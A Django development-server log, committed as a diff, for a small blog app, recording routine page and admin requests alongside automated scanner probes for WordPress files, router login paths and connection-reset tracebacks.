+[18/Jan/2021 22:47:00] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 22:47:00] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 22:47:01] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 22:49:02] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 22:49:03] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 22:49:03] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 22:49:04] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 22:49:05] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 22:49:14] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 22:49:15] "GET /static/css/blog_login.css HTTP/1.1" 200 1612
+[18/Jan/2021 22:49:24] "POST /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 22:49:27] "POST /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 22:49:30] "POST /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 22:49:33] "POST /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 22:49:38] "POST /auth/login HTTP/1.1" 200 2473
+Not Found: /wp-admin/install.php
+[18/Jan/2021 22:58:56] "GET /wp-admin/install.php?step=1 HTTP/1.1" 404 2278
+[18/Jan/2021 22:59:24] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
+[18/Jan/2021 22:59:24] "  à          " 400 -
+[18/Jan/2021 23:03:40] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 23:09:49] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 23:09:49] "GET /static/css/blog_font.css HTTP/1.1" 304 0
+[18/Jan/2021 23:09:49] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[18/Jan/2021 23:09:49] "GET /static/css/blog_base_nav.css HTTP/1.1" 304 0
+[18/Jan/2021 23:09:52] "GET /admin/ HTTP/1.1" 302 0
+[18/Jan/2021 23:09:52] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2214
+Not Found: /favicon.ico
+[18/Jan/2021 23:09:52] "GET /favicon.ico HTTP/1.1" 404 2244
+[18/Jan/2021 23:09:55] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[18/Jan/2021 23:09:55] "GET /admin/ HTTP/1.1" 200 5170
+[18/Jan/2021 23:09:56] "GET /admin/accounts/account/ HTTP/1.1" 200 6289
+[18/Jan/2021 23:09:56] "GET /admin/jsi18n/ HTTP/1.1" 200 8314
+[18/Jan/2021 23:09:58] "GET /admin/accounts/account/7/change/ HTTP/1.1" 200 20228
+[18/Jan/2021 23:09:58] "GET /admin/jsi18n/ HTTP/1.1" 200 8314
+[18/Jan/2021 23:10:01] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 23:10:01] "GET / HTTP/1.1" 200 1753
+Not Found: /wp-includes/wlwmanifest.xml
+[18/Jan/2021 23:10:02] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[18/Jan/2021 23:10:02] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[18/Jan/2021 23:10:02] "GET / HTTP/1.1" 200 1753
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[18/Jan/2021 23:10:03] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /web/wp-includes/wlwmanifest.xml
+[18/Jan/2021 23:10:03] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[18/Jan/2021 23:10:04] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+Not Found: /website/wp-includes/wlwmanifest.xml
+[18/Jan/2021 23:10:04] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2316
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[18/Jan/2021 23:10:04] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /news/wp-includes/wlwmanifest.xml
+[18/Jan/2021 23:10:05] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp1/wp-includes/wlwmanifest.xml
+[18/Jan/2021 23:10:05] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /test/wp-includes/wlwmanifest.xml
+[18/Jan/2021 23:10:06] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp2/wp-includes/wlwmanifest.xml
+[18/Jan/2021 23:10:06] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /site/wp-includes/wlwmanifest.xml
+[18/Jan/2021 23:10:07] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[18/Jan/2021 23:10:07] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /sito/wp-includes/wlwmanifest.xml
+[18/Jan/2021 23:10:07] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /HNAP1/
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 183, in finish_response
+    self.close()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 113, in close
+    self.get_stdin()._read_limited()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/wsgi.py", line 28, in _read_limited
+    result = self.stream.read(size)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[19/Jan/2021 00:16:05] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 00:16:05] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[19/Jan/2021 00:16:05] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[19/Jan/2021 00:16:05] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[19/Jan/2021 00:16:05] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[19/Jan/2021 00:16:14] "GET /auth/login HTTP/1.1" 200 2473
+[19/Jan/2021 00:16:14] "GET /static/css/blog_login.css HTTP/1.1" 200 1612
+[19/Jan/2021 00:16:24] "POST /auth/login HTTP/1.1" 200 2473
+[19/Jan/2021 00:16:27] "POST /auth/login HTTP/1.1" 200 2473
+[19/Jan/2021 00:16:30] "POST /auth/login HTTP/1.1" 200 2473
+[19/Jan/2021 00:16:33] "POST /auth/login HTTP/1.1" 200 2473
+[19/Jan/2021 00:16:38] "POST /auth/login HTTP/1.1" 200 2473
+[19/Jan/2021 00:17:09] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 00:17:10] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[19/Jan/2021 00:17:10] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[19/Jan/2021 00:17:10] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[19/Jan/2021 00:17:10] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[19/Jan/2021 00:17:18] "GET /auth/login HTTP/1.1" 200 2473
+[19/Jan/2021 00:17:18] "GET /static/css/blog_login.css HTTP/1.1" 200 1612
+[19/Jan/2021 00:17:25] "POST /auth/login HTTP/1.1" 200 2473
+[19/Jan/2021 00:17:28] "POST /auth/login HTTP/1.1" 200 2473
+[19/Jan/2021 00:17:31] "POST /auth/login HTTP/1.1" 200 2473
+[19/Jan/2021 00:17:34] "POST /auth/login HTTP/1.1" 200 2473
+[19/Jan/2021 00:17:38] "POST /auth/login HTTP/1.1" 200 2473
+[19/Jan/2021 00:31:31] "GET / HTTP/1.1" 200 1752
+[19/Jan/2021 00:31:31] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[19/Jan/2021 00:31:31] "GET /static/css/blog_base_nav.css HTTP/1.1" 304 0
+[19/Jan/2021 00:31:33] "GET /auth/logout HTTP/1.1" 302 0
+[19/Jan/2021 00:31:33] "GET /auth/login HTTP/1.1" 200 2473
+[19/Jan/2021 00:31:33] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[19/Jan/2021 00:31:45] "GET /admin/ HTTP/1.1" 302 0
+[19/Jan/2021 00:31:45] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2214
+Not Found: /favicon.ico
+[19/Jan/2021 00:31:45] "GET /favicon.ico HTTP/1.1" 404 2244
+[19/Jan/2021 00:31:47] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[19/Jan/2021 00:31:47] "GET /admin/ HTTP/1.1" 200 5170
+[19/Jan/2021 00:31:49] "GET /admin/accounts/account/ HTTP/1.1" 200 6289
+[19/Jan/2021 00:31:49] "GET /admin/jsi18n/ HTTP/1.1" 200 8314
+[19/Jan/2021 00:31:55] "GET /auth/signup HTTP/1.1" 200 5242
+[19/Jan/2021 00:31:55] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+[19/Jan/2021 00:31:56] "GET /auth/logout HTTP/1.1" 302 0
+[19/Jan/2021 00:31:56] "GET /auth/login HTTP/1.1" 200 2473
+[19/Jan/2021 00:32:02] "GET /auth/signup HTTP/1.1" 200 5243
+[19/Jan/2021 00:35:58] "GET /auth/signup HTTP/1.0" 200 5243
+[19/Jan/2021 00:39:27] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 00:44:15] "GET /auth/login HTTP/1.1" 200 2473
+[19/Jan/2021 00:44:15] "GET /auth/login HTTP/1.1" 200 2473
+[19/Jan/2021 00:44:15] "GET /auth/login HTTP/1.1" 200 2473
+[19/Jan/2021 00:44:16] "GET /auth/login HTTP/1.1" 200 2473
+[19/Jan/2021 00:48:33] "GET /auth/signup HTTP/1.1" 200 5243
+[19/Jan/2021 00:48:33] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[19/Jan/2021 00:48:33] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[19/Jan/2021 00:48:33] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[19/Jan/2021 00:48:33] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[19/Jan/2021 00:48:33] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[19/Jan/2021 00:48:43] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 00:48:44] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 00:48:46] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 00:48:47] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 00:48:48] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 01:14:54] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 01:14:57] "GET /auth/login HTTP/1.1" 200 2473
+[19/Jan/2021 01:15:01] "GET /auth/signup HTTP/1.1" 200 5243
+[19/Jan/2021 01:40:08] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 01:40:08] "GET / HTTP/1.1" 200 1753
+Not Found: /wp-includes/wlwmanifest.xml
+[19/Jan/2021 01:40:08] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[19/Jan/2021 01:40:08] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[19/Jan/2021 01:40:08] "GET / HTTP/1.1" 200 1753
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[19/Jan/2021 01:40:08] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /web/wp-includes/wlwmanifest.xml
+[19/Jan/2021 01:40:09] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[19/Jan/2021 01:40:09] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+Not Found: /website/wp-includes/wlwmanifest.xml
+[19/Jan/2021 01:40:09] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2316
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[19/Jan/2021 01:40:09] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /news/wp-includes/wlwmanifest.xml
+[19/Jan/2021 01:40:09] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2018/wp-includes/wlwmanifest.xml
+[19/Jan/2021 01:40:09] "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2019/wp-includes/wlwmanifest.xml
+[19/Jan/2021 01:40:10] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /shop/wp-includes/wlwmanifest.xml
+[19/Jan/2021 01:40:10] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp1/wp-includes/wlwmanifest.xml
+[19/Jan/2021 01:40:10] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /test/wp-includes/wlwmanifest.xml
+[19/Jan/2021 01:40:10] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /media/wp-includes/wlwmanifest.xml
+[19/Jan/2021 01:40:10] "GET /media/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2310
+Not Found: /wp2/wp-includes/wlwmanifest.xml
+[19/Jan/2021 01:40:10] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /site/wp-includes/wlwmanifest.xml
+[19/Jan/2021 01:40:10] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[19/Jan/2021 01:40:11] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /sito/wp-includes/wlwmanifest.xml
+[19/Jan/2021 01:40:11] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+[19/Jan/2021 01:47:53] "GET / HTTP/1.1" 200 1753
+Not Found: /wp-includes/wlwmanifest.xml
+[19/Jan/2021 01:47:53] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[19/Jan/2021 01:47:54] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[19/Jan/2021 01:47:54] "GET / HTTP/1.1" 200 1753
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[19/Jan/2021 01:47:55] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[19/Jan/2021 01:47:55] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[19/Jan/2021 01:47:56] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /site/wp-includes/wlwmanifest.xml
+[19/Jan/2021 01:47:56] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[19/Jan/2021 01:47:57] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /config/getuser
+[19/Jan/2021 02:31:22] "GET /config/getuser?index=0 HTTP/1.1" 404 2265
+[19/Jan/2021 02:42:39] "GET / HTTP/1.0" 200 1753
+[19/Jan/2021 02:42:40] "GET /auth/login HTTP/1.0" 200 2473
+[19/Jan/2021 02:42:40] "GET / HTTP/1.0" 200 1753
+[19/Jan/2021 02:42:41] "GET /auth/signup HTTP/1.0" 200 5243
+[19/Jan/2021 02:48:05] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 02:48:05] "GET / HTTP/1.1" 200 1753
+Not Found: /wp-includes/wlwmanifest.xml
+[19/Jan/2021 02:48:09] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[19/Jan/2021 02:48:10] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[19/Jan/2021 02:48:10] "GET / HTTP/1.1" 200 1753
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[19/Jan/2021 02:48:11] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /web/wp-includes/wlwmanifest.xml
+[19/Jan/2021 02:48:12] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[19/Jan/2021 02:48:12] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+Not Found: /website/wp-includes/wlwmanifest.xml
+[19/Jan/2021 02:48:13] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2316
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[19/Jan/2021 02:48:13] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /news/wp-includes/wlwmanifest.xml
+[19/Jan/2021 02:48:14] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2018/wp-includes/wlwmanifest.xml
+[19/Jan/2021 02:48:15] "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2019/wp-includes/wlwmanifest.xml
+[19/Jan/2021 02:48:15] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /shop/wp-includes/wlwmanifest.xml
+[19/Jan/2021 02:48:16] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp1/wp-includes/wlwmanifest.xml
+[19/Jan/2021 02:48:17] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /test/wp-includes/wlwmanifest.xml
+[19/Jan/2021 02:48:17] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /media/wp-includes/wlwmanifest.xml
+[19/Jan/2021 02:48:18] "GET /media/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2310
+Not Found: /wp2/wp-includes/wlwmanifest.xml
+[19/Jan/2021 02:48:18] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /site/wp-includes/wlwmanifest.xml
+[19/Jan/2021 02:48:19] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[19/Jan/2021 02:48:20] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /sito/wp-includes/wlwmanifest.xml
+[19/Jan/2021 02:48:20] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+[19/Jan/2021 03:01:13] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 03:01:13] "GET /static/css/blog_font.css HTTP/1.1" 304 0
+[19/Jan/2021 03:01:13] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[19/Jan/2021 03:01:13] "GET /static/css/blog_base_nav.css HTTP/1.1" 304 0
+[19/Jan/2021 03:01:16] "GET /auth/login HTTP/1.1" 200 2473
+[19/Jan/2021 03:01:16] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[19/Jan/2021 03:01:18] "GET /auth/signup HTTP/1.1" 200 5243
+[19/Jan/2021 03:01:18] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+[19/Jan/2021 03:01:25] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 03:01:26] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 03:01:27] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 03:01:28] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 03:01:29] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 03:01:31] "GET /auth/login HTTP/1.1" 200 2473
+[19/Jan/2021 03:01:33] "POST /auth/login HTTP/1.1" 302 0
+[19/Jan/2021 03:01:33] "GET / HTTP/1.1" 200 1752
+[19/Jan/2021 03:01:35] "GET / HTTP/1.1" 200 1752
+[19/Jan/2021 03:01:36] "GET / HTTP/1.1" 200 1752
+[19/Jan/2021 03:01:36] "GET / HTTP/1.1" 200 1752
+[19/Jan/2021 03:01:37] "GET / HTTP/1.1" 200 1752
+[19/Jan/2021 03:01:37] "GET / HTTP/1.1" 200 1752
+[19/Jan/2021 03:01:39] "GET / HTTP/1.1" 200 1752
+[19/Jan/2021 03:15:42] "GET / HTTP/1.1" 200 1752
+[19/Jan/2021 03:15:45] "GET /auth/logout HTTP/1.1" 302 0
+[19/Jan/2021 03:15:45] "GET /auth/login HTTP/1.1" 200 2473
+[19/Jan/2021 03:20:28] "GET /auth/signup HTTP/1.1" 200 5243
+[19/Jan/2021 03:20:28] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[19/Jan/2021 03:20:28] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[19/Jan/2021 03:20:28] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[19/Jan/2021 03:20:28] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[19/Jan/2021 03:20:28] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[19/Jan/2021 03:20:29] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[19/Jan/2021 03:20:30] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 03:20:33] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 03:20:33] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 03:20:34] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 03:20:35] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 03:20:36] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 03:38:07] "GET / HTTP/1.0" 200 1753
+[19/Jan/2021 03:39:28] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 03:39:35] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 03:39:35] "GET / HTTP/1.1" 200 1753
+Not Found: /wp-includes/wlwmanifest.xml
+[19/Jan/2021 03:39:35] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[19/Jan/2021 03:39:35] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[19/Jan/2021 03:39:36] "GET / HTTP/1.1" 200 1753
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[19/Jan/2021 03:39:36] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /web/wp-includes/wlwmanifest.xml
+[19/Jan/2021 03:39:36] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[19/Jan/2021 03:39:36] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+Not Found: /website/wp-includes/wlwmanifest.xml
+[19/Jan/2021 03:39:36] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2316
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[19/Jan/2021 03:39:36] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /news/wp-includes/wlwmanifest.xml
+[19/Jan/2021 03:39:37] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2020/wp-includes/wlwmanifest.xml
+[19/Jan/2021 03:39:37] "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2019/wp-includes/wlwmanifest.xml
+[19/Jan/2021 03:39:37] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /shop/wp-includes/wlwmanifest.xml
+[19/Jan/2021 03:39:37] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp1/wp-includes/wlwmanifest.xml
+[19/Jan/2021 03:39:37] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /test/wp-includes/wlwmanifest.xml
+[19/Jan/2021 03:39:37] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp2/wp-includes/wlwmanifest.xml
+[19/Jan/2021 03:39:38] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /site/wp-includes/wlwmanifest.xml
+[19/Jan/2021 03:39:38] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[19/Jan/2021 03:39:38] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /sito/wp-includes/wlwmanifest.xml
+[19/Jan/2021 03:39:38] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /HNAP1/
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 183, in finish_response
+    self.close()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 113, in close
+    self.get_stdin()._read_limited()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/wsgi.py", line 28, in _read_limited
+    result = self.stream.read(size)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[19/Jan/2021 04:43:59] "GET / HTTP/1.1" 200 1753
+----------------------------------------
+Exception happened during processing of request from ('73.17.85.137', 34640)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[19/Jan/2021 04:44:01] "GET / HTTP/1.1" 200 1753
+Not Found: /boaform/admin/formLogin
+[19/Jan/2021 04:51:32] "POST /boaform/admin/formLogin HTTP/1.1" 404 2285
+[19/Jan/2021 05:06:51] "GET / HTTP/1.1" 200 1753
+----------------------------------------
+Exception happened during processing of request from ('162.142.125.38', 46006)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[19/Jan/2021 05:20:31] "GET / HTTP/1.1" 200 1753
+----------------------------------------
+Exception happened during processing of request from ('162.142.125.38', 48434)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[19/Jan/2021 05:20:32] "GET / HTTP/1.1" 200 1753
